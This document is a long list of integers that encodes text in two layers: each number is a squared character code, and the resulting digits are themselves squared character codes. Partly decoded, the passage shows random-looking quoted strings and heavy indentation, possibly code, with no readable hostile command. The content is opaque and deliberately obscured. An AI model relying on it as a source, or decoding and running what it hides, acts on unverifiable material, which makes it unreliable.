9,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2401,2601,2500,2500,2809,1936,2809,2601,2500,3249,1936,2500,3025,2304,2704,1936,2401,2601,2500,2500,2809,1936,3025,3025,2704,2704,1936,2401,2304,2500,2304,2401,1936,3025,3025,2704,2704,1936,2401,2304,2500,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2401,2401,2916,2916,2704,1936,2809,2601,2500,3249,1936,2500,3025,2304,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2601,3249,2500,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2500,3025,2304,2704,1936,3025,3025,2704,2704,1936,2500,3249,2401,2916,1936,2401,2304,2500,2304,2401,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2809,2601,2500,3249,1936,2500,3249,2401,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2500,3249,2401,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2401,2601,2500,2500,2809,1936,3249,3136,2304,2401,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3249,3136,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2401,2601,3249,2500,2704,1936,2500,3025,2304,2704,1936,3249,3136,2304,2401,1936,2500,3249,2401,2916,1936,2401,2304,2500,2304,2401,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2809,2601,2500,3249,1936,2401,2401,2809,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2704,2304,2704,1936,2401,2401,2500,2601,2916,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2304,3136,2401,2916,1936,3249,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2601,2401,2601,2916,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2304,3136,3249,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,2304,3136,2401,2916,1936,2401,2304,2704,2304,2704,1936,2401,2401,2500,2601,2916,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2401,2304,2704,2304,2704,1936,2500,2601,2304,2704,1936,2401,2704,2916,2704,2401,1936,2916,3025,2500,2704,1936,2704,2601,2809,2916,1936,2401,2401,2500,2601,2916,1936,2809,2304,2704,2401,1936,2601,2401,2601,2916,1936,2704,2916,2500,2704,1936,2809,2304,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2704,2304,2704,1936,2401,2401,2500,2601,2916,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2401,2304,2704,2304,2704,1936,2500,2601,2304,2704,1936,2401,2704,2916,2704,2401,1936,2916,3025,2500,2704,1936,2704,2601,2809,2916,1936,2401,2401,2500,2601,2916,1936,2809,2304,2704,2401,1936,2601,2401,2601,2916,1936,2704,2916,2500,2704,1936,2809,2304,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2601,2704,2809,2916,1936,2401,2304,2304,2304,2304,1936,2809,2304,2704,2401,1936,2401,2500,2809,2704,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2916,2304,2304,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2500,3025,2304,2704,1936,2809,2601,2500,3249,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2401,2500,2601,2916,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3025,3025,2704,2704,1936,2916,2809,2916,2401,1936,3025,3025,2704,2704,1936,2401,2304,2500,2304,2401,1936,2500,3025,2304,2704,1936,2401,2916,3136,2401,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2500,3025,2304,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2500,2916,2304,2401,1936,2401,2704,2401,2916,2401,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2809,2304,2704,2401,1936,2916,3025,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2916,3025,2500,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2916,3025,2500,2704,1936,2401,2704,2401,2916,2401,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2809,2704,3025,2916,1936,2809,2401,3136,2704,1936,3025,2601,3249,2916,1936,2401,2500,3249,3249,2916,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2916,3025,2500,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2500,2401,2304,2304,1936,2916,3025,2500,2704,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2916,2304,2304,1936,2401,2304,3136,3249,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2916,3025,2500,2704,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2916,3025,2500,2704,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2916,2304,2304,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2809,2304,2704,2401,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2809,2704,3025,2916,1936,2809,2401,3136,2704,1936,3025,2601,3249,2916,1936,2401,2500,3249,3249,2916,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2916,3025,2500,2704,1936,2500,2916,2304,2401,1936,2401,2704,2401,2916,2401,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2809,2304,2704,2401,1936,2916,3025,2500,2704,1936,3025,2601,3249,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,3249,2916,2304,2704,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2916,3025,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2916,3025,2500,2704,1936,2401,2704,2401,2916,2401,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2